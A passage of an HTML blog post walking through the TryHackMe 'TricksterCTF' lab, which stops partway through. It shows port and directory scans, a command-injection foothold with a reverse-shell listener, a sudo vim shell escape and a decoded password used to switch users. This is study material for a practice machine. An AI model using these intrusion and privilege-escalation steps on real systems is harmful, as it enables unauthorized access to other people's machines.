@@ -1,0 +1,809 @@
+<!DOCTYPE html><html lang="en-US" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="TricksterCTF - TryHackMe" /><meta name="author" content="Vishnu Sudhakaran" /><meta property="og:locale" content="en_US" /><meta name="description" content="Cyber Security Blogs / CTF Writeups" /><meta property="og:description" content="Cyber Security Blogs / CTF Writeups" /><link rel="canonical" href="https://an0n4ce.github.io/blog/posts/tricksterctf-tryhackme-writeup/" /><meta property="og:url" content="https://an0n4ce.github.io/blog/posts/tricksterctf-tryhackme-writeup/" /><meta property="og:site_name" content="an0n4ce" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2025-03-04T11:00:00+05:30" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="TricksterCTF - TryHackMe" /><meta name="twitter:site" content="@an0n4ce" /><meta name="twitter:creator" content="@Vishnu Sudhakaran" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Vishnu Sudhakaran"},"dateModified":"2025-03-04T14:11:31+05:30","datePublished":"2025-03-04T11:00:00+05:30","description":"Cyber Security Blogs / CTF Writeups","headline":"TricksterCTF - TryHackMe","mainEntityOfPage":{"@type":"WebPage","@id":"https://an0n4ce.github.io/blog/posts/tricksterctf-tryhackme-writeup/"},"url":"https://an0n4ce.github.io/blog/posts/tricksterctf-tryhackme-writeup/"}</script><title>TricksterCTF - TryHackMe | an0n4ce</title><link rel="apple-touch-icon" sizes="180x180" href="/blog/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/blog/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/blog/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/blog/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/blog/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="an0n4ce"><meta name="application-name" content="an0n4ce"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/blog/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/blog/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/blog/" alt="avatar" class="mx-auto"> <img src="/blog/assets/img/commons/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/blog/">an0n4ce</a></div><div class="site-subtitle font-italic">CEH / Pentester / Security 3nthusias7</div></div><ul class="w-100"><li class="nav-item"> <a href="/blog/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/blog/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/blog/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/blog/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/blog/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/an0n4ce" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/an0n4ce" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['an0n4ce','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/blog/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/blog/"> Home </a> </span> <span>TricksterCTF - TryHackMe</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>TricksterCTF - TryHackMe</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Vishnu Sudhakaran </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Mar 4, 2025, 11:00 AM +0530" >Mar 4, 2025<i class="unloaded">2025-03-04T11:00:00+05:30</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Tue, Mar 4, 2025, 2:11 PM +0530" >Mar 4, 2025<i class="unloaded">2025-03-04T14:11:31+05:30</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2843 words">15 min read</span></div></div><div class="post-content"><p><img data-proofer-ignore data-src="/blog/assets/img/posts/mns/28.png" alt="" /></p><p>An awesome beginner-friendly CTF challenge to test your enumeration skills. Let’s exploit the <a href="https://tryhackme.com/jr/tricksterctf">machine</a>.</p><p>You can also set up this machine locally on a Virtual Machine. Please find the <a href="https://drive.google.com/file/d/1I2eeCcY3C6jEtwNaBjLOMQk-jG8UqXmV/view?usp=drive_link">download link</a>.</p><h2 id="reconnaissance">Reconnaissance:</h2><p>Let’s start by identifying the machine’s IP address using the <code class="language-plaintext highlighter-rouge">nmap</code> or <code class="language-plaintext highlighter-rouge">netdiscover</code> tool.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+</pre><td class="rouge-code"><pre>➜ nmap <span class="nt">-sn</span> 192.168.20.1/24      
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-02-28 01:43 EST
+Nmap scan report <span class="k">for </span>192.168.20.1
+Host is up <span class="o">(</span>0.0022s latency<span class="o">)</span><span class="nb">.</span>
+Nmap scan report <span class="k">for </span>192.168.20.2
+Host is up <span class="o">(</span>0.00083s latency<span class="o">)</span><span class="nb">.</span>
+Nmap scan report <span class="k">for </span>192.168.20.15
+Host is up <span class="o">(</span>0.0015s latency<span class="o">)</span><span class="nb">.</span>
+Nmap <span class="k">done</span>: 256 IP addresses <span class="o">(</span>3 hosts up<span class="o">)</span> scanned <span class="k">in </span>1.62 seconds
+
+</pre></table></code></div></div><p>Let’s perform a basic <code class="language-plaintext highlighter-rouge">nmap</code> scan to identify open ports and running services.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+</pre><td class="rouge-code"><pre>➜ nmap <span class="nt">-sCV</span> <span class="nt">-A</span> 192.168.20.15
+Starting Nmap 7.94SVN <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-02-28 01:53 EST
+Nmap scan report <span class="k">for </span>192.168.20.15
+Host is up <span class="o">(</span>0.0012s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 996 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.11 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   256 e7:cf:05:a9:fd:61:f6:7d:9f:92:1f:39:91:2b:9b:ff <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 f7:41:2f:51:4c:3f:5c:70:39:03:fc:c4:52:76:c4:d1 <span class="o">(</span>ED25519<span class="o">)</span>
+23/tcp   open  ftp     vsftpd 3.0.3
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:192.168.20.2
+|      Logged <span class="k">in </span>as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 3
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+|_Can<span class="s1">'t get directory listing: PASV IP 172.17.0.2 is not the same as 192.168.20.15
+80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Eventoz : Home
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+2222/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 9b:e4:63:77:4e:3a:aa:11:c1:fa:56:c9:b5:4c:b4:68 (RSA)
+|   256 0f:28:ff:b0:bd:8a:0e:6f:24:6d:04:bb:08:5b:b1:74 (ECDSA)
+|_  256 34:88:5f:80:32:31:ab:71:67:c0:5e:9f:21:68:12:4f (ED25519)
+Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.72 seconds
+
+</span></pre></table></code></div></div><p>There is a webserver running on port 80, let’s have a look.</p><p><img data-proofer-ignore data-src="/blog/assets/img/posts/mns/20.png" alt="" /></p><p>It’s just a nicely themed dummy web page. While crawling through the webpage <code class="language-plaintext highlighter-rouge">ffuf</code> reveals an interesting <code class="language-plaintext highlighter-rouge">/compliants.php</code> file.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+</pre><td class="rouge-code"><pre>➜ ffuf <span class="nt">-w</span> /usr/share/wordlists/dirb/common.txt <span class="nt">-u</span> http://192.168.20.15/FUZZ <span class="nt">-e</span> .php,.html
+
+        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://192.168.20.13/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Extensions       : .php .html 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+________________________________________________
+
+.php                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3ms]
+.hta.html               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 6ms]
+.htpasswd.php           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 6ms]
+.html                   [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 7ms]
+.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 10ms]
+                        [Status: 200, Size: 37811, Words: 3829, Lines: 946, Duration: 6ms]
+assets                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 3ms]
+.htaccess.html          [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 448ms]
+.htaccess.php           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 451ms]
+.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 453ms]
+.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 461ms]
+.htpasswd.html          [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 466ms]
+.hta.php                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 468ms]
+complaints.php          [Status: 200, Size: 1017, Words: 91, Lines: 41, Duration: 3ms]
+index.html              [Status: 200, Size: 37811, Words: 3829, Lines: 946, Duration: 3ms]
+index.html              [Status: 200, Size: 37811, Words: 3829, Lines: 946, Duration: 7ms]
+mailer.php              [Status: 403, Size: 59, Words: 10, Lines: 1, Duration: 3ms]
+server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 4ms]
+:: Progress: [13842/13842] :: Job [1/1] :: 112 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
+</span></pre></table></code></div></div><p><img data-proofer-ignore data-src="/blog/assets/img/posts/mns/21.png" alt="" /></p><p>When we enter some input and submit the data, we notice parameters appearing in the URL.</p><p><img data-proofer-ignore data-src="/blog/assets/img/posts/mns/22.png" alt="" /></p><p>And the interesting part is that the <code class="language-plaintext highlighter-rouge">/action_page.php?fname=</code> URL parameter is vulnerable for Command Injection.</p><p><img data-proofer-ignore data-src="/blog/assets/img/posts/mns/23.png" alt="" /></p><h2 id="gaining-foothold">Gaining foothold:</h2><p>I have tried to get a direct reverse shell connection by giving reverse shell commands nc,python,php but it all has failed :(</p><p>So i get a <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">php</a> reverse shell and made the necessary changes on IP and Port.</p><p><img data-proofer-ignore data-src="/blog/assets/img/posts/mns/24.png" alt="" /></p><p>I set up a <code class="language-plaintext highlighter-rouge">python</code> HTTP server to share files over the network and uploaded the PHP reverse shell using the <code class="language-plaintext highlighter-rouge">wget</code> command.</p><p><img data-proofer-ignore data-src="/blog/assets/img/posts/mns/25.png" alt="" /></p><p>And Set a listener and call it.</p><p><img data-proofer-ignore data-src="/blog/assets/img/posts/mns/26.png" alt="" /></p><p>We have successfully obtained a reverse shell as <code class="language-plaintext highlighter-rouge">www-data</code>. Next, let’s check for sudo privileges by running the <code class="language-plaintext highlighter-rouge">sudo -l</code> command.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre>➜ nc <span class="nt">-lnvp</span> 443 
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.20.2] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.20.15] 57568
+Linux 15b18bf5f8ec 5.15.0-133-generic <span class="c">#144-Ubuntu SMP Fri Feb 7 20:47:38 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux</span>
+ 13:01:03 up  1:04,  0 <span class="nb">users</span>,  load average: 0.67, 0.19, 0.12
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>,1000<span class="o">(</span>john<span class="o">)</span>
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data),1000(john)
+$ sudo -l
+Matching Defaults entries for www-data on 15b18bf5f8ec:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on 15b18bf5f8ec:
+    (john) NOPASSWD: /bin/vim
+$ 
+</span></pre></table></code></div></div><h2 id="privilege-escalation">Privilege Escalation:</h2><p>The output shows that the user <code class="language-plaintext highlighter-rouge">www-data</code> has permission to run the following commands on the machine. And the entry <code class="language-plaintext highlighter-rouge">(john) NOPASSWD: /bin/vim</code> indicates that <code class="language-plaintext highlighter-rouge">www-data</code> can execute the <code class="language-plaintext highlighter-rouge">vim</code> text editor as the user john without requiring a password, providing a potential privilege escalation.</p><p>Here we can exploit the <code class="language-plaintext highlighter-rouge">vim</code> binary to escalate privileges and gain access as the <code class="language-plaintext highlighter-rouge">john</code> user, as outlined in <a href="https://gtfobins.github.io/gtfobins/vim/">GTFOBins</a>.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>www-data on 15b18bf5f8ec:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User www-data may run the following commands on 15b18bf5f8ec:
+    <span class="o">(</span>john<span class="o">)</span> NOPASSWD: /bin/vim
+
+<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> john /bin/vim <span class="nt">-c</span> <span class="s1">':!/bin/sh'</span>
+
+:!/bin/sh
+<span class="nb">whoami
+</span>john
+<span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>john<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>
+
+</pre></table></code></div></div><p>Let’s upgrade to an interactive TTY shell using <code class="language-plaintext highlighter-rouge">python</code>.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+</pre><td class="rouge-code"><pre>which python
+/usr/bin/python3
+
+python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+
+Low_Priv Shell <span class="nv">$:</span>
+</pre></table></code></div></div><p>We can find our first flag in <code class="language-plaintext highlighter-rouge">/home/john/flag_1.txt</code></p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>Low_Priv Shell <span class="nv">$:</span><span class="nb">cat </span>fl4g-1.txt
+<span class="nb">cat </span>flag_1.txt
+3ba54cbe7f<span class="o">{</span>REDACTED<span class="o">}</span>
+Low_Priv Shell <span class="nv">$:</span>
+
+</pre></table></code></div></div><p>When checking <code class="language-plaintext highlighter-rouge">john</code>’s sudo privileges, we discover another user named <code class="language-plaintext highlighter-rouge">david</code>.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre>Low_Priv Shell <span class="nv">$:</span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>john on 15b18bf5f8ec:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User john may run the following commands on 15b18bf5f8ec:
+    <span class="o">(</span>david<span class="o">)</span> NOPASSWD: /bin/grep
+
+</pre></table></code></div></div><p>Also in john’s home directory, we find a suspicious <code class="language-plaintext highlighter-rouge">.l0g</code> file. Upon reading it, we discover a <code class="language-plaintext highlighter-rouge">note.txt</code> in david’s home directory.”</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+</pre><td class="rouge-code"><pre>Low_Priv Shell <span class="nv">$:</span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="nb">ls</span> <span class="nt">-la</span>
+total 52
+drwxr-xr-x 1 john john 4096 Feb 13 23:53 <span class="nb">.</span>
+drwxr-xr-x 1 root root 4096 May  5  2021 ..
+<span class="nt">-rw-------</span> 1 john john  284 May  5  2021 .bash_history
+<span class="nt">-rw-r--r--</span> 1 john john  220 Feb 25  2020 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 john john 3803 May  1  2021 .bashrc
+drwx------ 2 john john 4096 May  1  2021 .cache
+<span class="nt">-rw-r--r--</span> 1 root root 1132 May  5  2021 .l0g
+<span class="nt">-rw-r--r--</span> 1 john john  807 Feb 25  2020 .profile
+drwxr-xr-x 2 john john 4096 May  2  2021 .ssh
+<span class="nt">-rw-------</span> 1 john john  559 Feb 13 23:53 .viminfo
+<span class="nt">-rw-r--r--</span> 1 root root   65 May  5  2021 flag_1.txt
+Low_Priv Shell <span class="nv">$:</span><span class="nb">cat</span> .l0g
+<span class="nb">cat</span> .l0g
+total 24
+drwxr-xr-x 1 root  root  4096 May  5 02:09 <span class="nb">.</span>
+drwxr-xr-x 1 root  root  4096 May  5 01:37 ..
+drwx-----x 2 david david 4096 May  5 02:15 david
+drwxr-xr-x 1 john  john  4096 May  5 02:17 john
+david/:
+total 32
+drwx-----x 2 david david 4096 May  5 02:15 <span class="nb">.</span>
+drwxr-xr-x 1 root  root  4096 May  5 02:09 ..
+<span class="nt">-rw-------</span> 1 david david    5 May  5 02:13 .bash_history
+<span class="nt">-rw-r--r--</span> 1 david david  220 Feb 25  2020 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 david david 3803 May  5 02:13 .bashrc
+<span class="nt">-rw-r--r--</span> 1 david david  807 Feb 25  2020 .profile
+<span class="nt">-rw-r--r--</span> 1 root  root   367 May  5 01:47 note.txt
+
+john/:
+total 52
+drwxr-xr-x 1 john john 4096 May  5 02:17 <span class="nb">.</span>
+drwxr-xr-x 1 root root 4096 May  5 02:09 ..
+<span class="nt">-rw-------</span> 1 john john  201 May  5 02:11 .bash_history
+<span class="nt">-rw-r--r--</span> 1 john john  220 Feb 25  2020 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 john john 3803 May  1 19:36 .bashrc
+drwx------ 2 john john 4096 May  1 19:48 .cache
+<span class="nt">-rw-r--r--</span> 1 root root  197 May  5 02:17 .log.file
+<span class="nt">-rw-r--r--</span> 1 john john  807 Feb 25  2020 .profile
+drwxr-xr-x 2 john john 4096 May  2 09:25 .ssh
+<span class="nt">-rw-------</span> 1 john john  559 May  2 09:42 .viminfo
+<span class="nt">-rw-r--r--</span> 1 root root   65 May  5 01:39 flag_1.txt
+
+</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">note.txt</code> file contains multiple encoded password strings, specifically in <code class="language-plaintext highlighter-rouge">base64</code> and <code class="language-plaintext highlighter-rouge">rot13</code>. We can assume this might be the password for the <code class="language-plaintext highlighter-rouge">david</code> user.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+</pre><td class="rouge-code"><pre>Low_Priv Shell <span class="nv">$:</span><span class="nb">cat</span> /home/david/note.txt
+<span class="nb">cat</span> /home/david/note.txt
+My_Dairy 00:66:33:22:66
+<span class="nt">----------------------</span>
+Hey, I am david , Employee of CSS_Platent. I know I am good <span class="k">in </span>security. AS this is my home floder which cannot acessed by a thirdparty, I can save my datas here. no one can see my datas.but still I will encrypt my datas <span class="k">for </span>security
+
+<span class="nb">uname</span> : davaid_look001919
+mail : david911@cssplatent.com
+pass : <span class="nv">c3lianJlb25mcjEwMgo</span><span class="o">=</span>
+
+Low_Priv Shell <span class="nv">$:</span><span class="nb">echo</span> <span class="s1">'c3lianJlb25mcjEwMgo='</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+<span class="nb">echo</span> <span class="s1">'c3lianJlb25mcjEwMgo='</span> | <span class="nb">base64</span> <span class="nt">-d</span>
+sybjreonfr102
+
+Low_Priv Shell <span class="nv">$:</span>su david
+su david
+Password: flower<span class="o">{</span>REDACTED<span class="o">}</span>
+
+Mid_PrivShell <span class="nv">$:</span> <span class="nb">id    
+id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>david<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>david<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>david<span class="o">)</span>
+Mid_PrivShell <span class="nv">$:</span> 
+
+</pre></table></code></div></div><p>We have switched to the <code class="language-plaintext highlighter-rouge">david</code> user. Unfortunately, the second flag is not found in david’s home directory. However, by examining the <code class="language-plaintext highlighter-rouge">.bash_history</code> file, we discover the path to the second flag, another <code class="language-plaintext highlighter-rouge">note.txt</code> file, and a suspicious executable file named <code class="language-plaintext highlighter-rouge">odus</code>.</p><div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+</pre><td class="rouge-code"><pre>Mid_PrivShell <span class="nv">$:</span> <span class="nb">cat</span> .bash_history
+<span class="nb">cat</span> .bash_history
+<span class="nb">exit
+ls
+cd</span> /
+find / <span class="nt">-type</span> f <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s 2&gt;/dev/null
+<span class="nb">mv</span> /home/david/.bin/8/0/1/9/4/0/wget /home/david/.bin/8/0/1/9/4/0/find_it_by_yourself
+<span class="nb">exit
+sudo</span> <span class="nt">-l</span>
+<span class="nb">ls
+</span>clear
+<span class="nb">ls
+cp</span>  /home/david/.bin/8/0/1/9/4/0/find_it_by_yourself  /tmp/wget
+<span class="nb">cp</span>  /home/david/.bin/8/0/1/9/4/0/odus  /tmp/wget
+<span class="nb">exit
+
+</span>Mid_PrivShell <span class="nv">$:</span> <span class="nb">cd</span> .bin/8/0/1/9/4/0
+<span class="nb">cd</span> .bin/8/0/1/9/4/0
+Mid_PrivShell <span class="nv">$:</span> <span class="nb">ls
+ls
+</span>fl4g_2.txt  note.txt  odus
+
+Mid_PrivShell <span class="nv">$:</span> <span class="nb">cat </span>fl4g_2.txt
+<span class="nb">cat </span>fl4g_2.txt
+075c15ee4<span class="o">{</span>REDACTED<span class="o">}</span>
+
+Mid_PrivShell <span class="nv">$:</span> <span class="nb">cat </span>note.txt
+<span class="nb">cat </span>note.txt
+So your reach the final stage...
+so everything depends upon your way of thing and practical usage and logical thiking of varius applications to find this hidden app
+I can only tell you one thing. If you can find this file, Your path is perfect. 
+Go on
+Few steps remaining
+
